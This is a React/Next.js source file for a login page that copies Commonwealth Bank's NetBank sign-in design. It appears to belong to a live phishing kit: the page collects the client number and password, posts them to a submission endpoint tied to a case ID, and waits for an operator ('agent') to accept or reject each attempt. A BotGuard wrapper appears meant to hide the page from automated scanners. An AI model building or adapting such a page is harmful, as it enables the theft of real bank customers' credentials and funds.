'use client';

/**
 * CBA Credentials Page
 * 
 * Pixel-perfect match to CommBank NetBank login design
 * Two-column layout: Login form (60%) + New to NetBank sidebar (40%)
 * Client number + Password fields with yellow pill Log on button
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { AlertCircle, Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

// Lock Icon SVG component matching reference
function LockIcon() {
  return (
    <svg className="lock-icon" width="12" height="14" viewBox="0 0 12 14" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path
        d="M10 5H9V3.5C9 1.57 7.43 0 5.5 0C3.57 0 2 1.57 2 3.5V5H1C0.45 5 0 5.45 0 6V13C0 13.55 0.45 14 1 14H10C10.55 14 11 13.55 11 13V6C11 5.45 10.55 5 10 5ZM5.5 11C4.67 11 4 10.33 4 9.5C4 8.67 4.67 8 5.5 8C6.33 8 7 8.67 7 9.5C7 10.33 6.33 11 5.5 11ZM7.5 5H3.5V3.5C3.5 2.4 4.4 1.5 5.5 1.5C6.6 1.5 7.5 2.4 7.5 3.5V5Z"
        fill="#000"
      />
    </svg>
  );
}

// Shield Icon SVG component
function ShieldIcon() {
  return (
    <svg className="shield-icon" width="20" height="24" viewBox="0 0 20 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path
        d="M10 0L0 4V11C0 17.05 4.27 22.74 10 24C15.73 22.74 20 17.05 20 11V4L10 0ZM8 17L4 13L5.41 11.59L8 14.17L14.59 7.58L16 9L8 17Z"
        fill="#7A7A7A"
      />
    </svg>
  );
}

// Arrow Icon SVG component
function ArrowIcon() {
  return (
    <svg className="arrow-icon" width="8" height="10" viewBox="0 0 8 10" fill="none" xmlns="http://www.w3.org/2000/svg">
      <polygon points="0,0 8,5 0,10" fill="#FFCC00" />
    </svg>
  );
}

export default function CredentialsPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId } = useSessionStore();
  const { agentMessage } = useSessionStore();

  const [clientNumber, setClientNumber] = useState('');
  const [password, setPassword] = useState('');
  const [rememberClient, setRememberClient] = useState(false);
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Reset form when agent rejects submission
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setClientNumber('');
      setPassword('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!clientNumber.trim()) {
        setFieldError('Please enter your client number');
        return;
      }

      if (!password) {
        setFieldError('Please enter your password');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username: clientNumber.trim(),
            password,
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your credentials. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [clientNumber, password, sessionUuid, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      <div className="main-container">
        {/* Login Section - Two Columns */}
        <section className="login-section">
          {/* Left Column - Login Form */}
          <div className="login-box">
            <div className="box-header">
              <span>Log on to NetBank</span>
            </div>
            <div className="box-content">
              <form id="loginForm" className="login-form" onSubmit={handleSubmit}>
                <div className="form-row">
                  <label htmlFor="clientNumber" className="form-label">Client number</label>
                  <input
                    type="text"
                    id="clientNumber"
                    name="clientNumber"
                    className="form-input"
                    autoComplete="username"
                    value={clientNumber}
                    onChange={(e) => {
                      setClientNumber(e.target.value);
                      if (fieldError) setFieldError('');
                    }}
                    disabled={isWaiting}
                  />
                </div>

                <div className="form-row">
                  <label htmlFor="password" className="form-label">Password</label>
                  <input
                    type="password"
                    id="password"
                    name="password"
                    className="form-input"
                    autoComplete="current-password"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      if (fieldError) setFieldError('');
                    }}
                    disabled={isWaiting}
                  />
                </div>

                <div className="form-row checkbox-row">
                  <input
                    type="checkbox"
                    id="rememberClient"
                    name="rememberClient"
                    className="form-checkbox"
                    checked={rememberClient}
                    onChange={(e) => setRememberClient(e.target.checked)}
                    disabled={isWaiting}
                  />
                  <label htmlFor="rememberClient" className="checkbox-label">Remember client number</label>
                </div>

                {/* Error message */}
                {fieldError && (
                  <div className="error-message" style={{ marginLeft: '110px', marginBottom: '10px' }}>
                    <AlertCircle className="h-4 w-4" />
                    <span>{fieldError}</span>
                  </div>
                )}

                <div className="form-row button-row">
                  <button type="submit" id="btnLogon" className="logon-button" disabled={isWaiting}>
                    {isWaiting ? (
                      <Loader2 className="h-4 w-4 animate-spin" />
                    ) : (
                      <LockIcon />
                    )}
                    <span>{isWaiting ? 'Logging on...' : 'Log on'}</span>
                  </button>
                </div>
              </form>

              <div className="form-footer">
                <a href="#" className="forgot-link">I've forgotten my log on details</a>
              </div>
            </div>
          </div>

          {/* Right Column - New to NetBank */}
          <div className="new-box">
            <div className="box-header">
              <span>New to NetBank?</span>
            </div>
            <div className="box-content new-content">
              <ul className="new-links">
                <li><a href="#">Register for NetBank now</a></li>
                <li><a href="#">Online support for our products and services</a></li>
                <li><a href="#">Tips to stay safe online</a></li>
              </ul>
              <div className="protection-notice">
                <ShieldIcon />
                <a href="#" className="protection-link">Protection for unauthorised transactions</a>
              </div>
            </div>
          </div>
        </section>

        {/* Promo Tile */}
        <section className="promo-section">
          <div className="promo-tile">
            <div className="promo-image">
              <img src="/brands/cba/Netbank_login_Branch.jpg" alt="CommBank branch" />
            </div>
            <div className="promo-content">
              <p className="promo-text"><strong>More branches than any other bank. No doubt.</strong></p>
              <a href="#" className="promo-link">
                <ArrowIcon />
                <span>Locate us</span>
              </a>
            </div>
          </div>
        </section>

        {/* Quicklinks Section */}
        <section className="quicklinks-section">
          <h3 className="quicklinks-title">Quicklinks</h3>
          <ul className="quicklinks-list">
            <li>
              <ArrowIcon />
              <a href="#">Financial difficulty support for your business. Find out more</a>
            </li>
            <li>
              <ArrowIcon />
              <a href="#">Refinance your eligible home loan. See how</a>
            </li>
            <li>
              <ArrowIcon />
              <a href="#">Are you experiencing financial difficulty? Get help</a>
            </li>
            <li>
              <ArrowIcon />
              <a href="#">Use Benefits finder to find grants, rebates and concessions you may be eligible for</a>
            </li>
          </ul>
        </section>
      </div>
    </BotGuard>
  );
}
